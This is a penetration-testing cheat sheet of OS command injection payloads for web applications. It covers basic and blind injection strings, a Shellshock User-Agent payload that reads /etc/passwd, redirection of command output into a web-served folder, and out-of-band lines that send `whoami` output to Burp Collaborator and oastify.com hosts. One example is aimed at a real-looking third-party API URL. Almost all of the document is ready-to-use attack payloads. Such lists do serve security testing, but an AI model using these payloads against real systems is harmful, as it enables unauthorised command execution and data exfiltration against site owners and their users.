# OS Command Injection Payloads
___
## Wordlist
```sh
;whoami;
;sleep+10;
nslookup+burpcollaborator.net
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
```
## Simple Case
```sh
& echo test &

& whoami #

;ls

;ls;

User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent Header.
```
## Blind injection
Example:  name=test&email=```;sleep 5;```&message=test or, name=test&email=```||sleep 5||```&message=test
```sh
; sleep 10 ||

& sleep 10 #

; sleep 10 ;

asd||sleep 5|| >> Middle of two parameter.

||ping+-c+10+127.0.0.1||

& ping -c 10 127.0.0.1

asd||sleep 5 # >> Last parameter or to comment out extra parameter
```
## Blind injection with output redirection
If you identified a blind Command Injection try to find a writable folder to read your output. Suppose, if a application serves it's images for the product catalog from location like ```/image?filename=22.jpg```, you can redirect the output from the injected command to a file in this ```images``` folder, and then use this URL to retrieve the contents of the file.
```sql
& whoami > /var/www/images/output.txt #
; whoami > /var/www/images/output.txt ;
```
Now, you can read content like this ```/image?filename=output.txt```

## Out of band
```sh
||nslookup x.vyx05udastzq6llyo3y9vqiswj2aq3vrk.oastify.com||

& nslookup x.burpcollaborator.net #

& nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup $(whoami).xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-01: /api/v1/pdf/generate_zip?seed_id=521b62f5b7132de722027388|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cname 0vwm3493ytajvrc4a2g7ptfmgdm7a04o0crzhn6.burpcollaborator.net.&.zip

Example-03: email=a%40a.com|nslookup+-q%3dcname+6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.%26.zip
```
